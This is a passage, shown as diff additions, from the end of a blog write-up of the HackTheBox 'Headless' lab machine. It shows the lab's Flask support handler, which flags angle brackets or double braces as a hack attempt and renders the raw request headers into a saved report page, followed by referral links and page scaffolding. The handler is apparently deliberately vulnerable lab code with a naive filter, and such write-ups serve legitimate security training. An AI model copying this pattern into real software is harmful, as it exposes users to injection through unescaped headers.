class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:            </span><br><span class="line">        message = request.form.get(<span class="string">&#x27;message&#x27;</span>)  </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&lt;&quot;</span> <span class="keyword">in</span> message and <span class="string">&quot;&gt;&quot;</span> <span class="keyword">in</span> message) or (<span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> message and <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> message):</span><br><span class="line">            request_info = &#123;                                                                </span><br><span class="line">                <span class="string">&quot;Method&quot;</span>: request.method,    </span><br><span class="line">                <span class="string">&quot;URL&quot;</span>: request.url,</span><br><span class="line">                <span class="string">&quot;Headers&quot;</span>: format_request_info(dict(request.headers)),                      </span><br><span class="line">            &#125;                                                                               </span><br><span class="line">                                             </span><br><span class="line">            formatted_request_info = format_request_info(request_info)</span><br><span class="line">            html = render_template(<span class="string">&#x27;hackattempt.html&#x27;</span>, request_info=formatted_request_info)   </span><br><span class="line"></span><br><span class="line">            filename = f<span class="string">&#x27;&#123;random.randint(1, 99999999999999999999999)&#125;.html&#x27;</span>                 </span><br><span class="line">            with open(os.path.join(hacking_reports_dir, filename), <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) as html_file:                                                                                   </span><br><span class="line">                html_file.write(html)   </span><br><span class="line">                                             </span><br><span class="line">            <span class="built_in">return</span> html  </span><br><span class="line">                                                                                            </span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;support.html&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>我還以爲要繞過waf，hh</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&text=HackTheBox - Machine - Headless"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&is_video=false&description=HackTheBox - Machine - Headless"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Headless&body=Check out this article: https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&title=HackTheBox - Machine - Headless"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&name=HackTheBox - Machine - Headless&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/24/2024-htb-machine/12-Headless/&t=HackTheBox - Machine - Headless"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
